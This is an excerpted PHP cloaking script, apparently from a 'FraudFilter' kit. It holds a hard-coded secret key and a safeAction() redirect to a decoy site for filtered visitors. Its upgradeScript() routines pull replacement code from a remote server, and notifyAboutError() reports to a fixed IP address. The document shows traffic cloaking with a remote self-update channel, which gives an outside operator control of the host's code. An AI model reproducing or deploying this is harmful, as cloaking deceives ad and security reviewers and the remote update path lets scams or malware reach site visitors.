...
class FraudFilterDetector_ojk7p {
    ...
    function isSignatureValid($sign, $time) {
        $str = '99a75576-5ccb-43b7-a812-432014883750.'.$this->getClid().'.'.$time;
        $sha = sha1($str);
        return $sign === $sha;
    }
...
<?php
    ...
    function safeAction() {
        $this->redirect('http://www.rogersgreenhouse.com');
    }
    ...
    function getUpgradeScriptViaContents($home, $fileName) {
        $opts = array('http' =>
            array(
                'method'  => 'GET',
                'header' => 'x-ff-secret: 99a75576-5ccb-43b7-a812-432014883750',
                'timeout' => 2
            )
        );
    ...
    function upgradeScript($home, $fileName) {
        ...
        if ($output === false || !$this->isSignature2Valid($output)) {
            ...
            $headers[] = 'x-ff-secret: 99a75576-5ccb-43b7-a812-432014883750';
...
";
    ...
    function fillAllPostHeaders() {
        ...
        $headers[] = 'X-FF-P: 99a75576-5ccb-43b7-a812-432014883750';
    ...
    function notifyAboutError($message) {
        ...
        $url = 'http://139.59.212.55/ff-notify.html?v=ff1&guid=ojk7p&m='.$message;
        $ch = curl_init($url);
...
$fraudFilterDetector_ojk7p = new FraudFilterDetector_ojk7p();
$fraudFilterDetector_ojk7p->check();
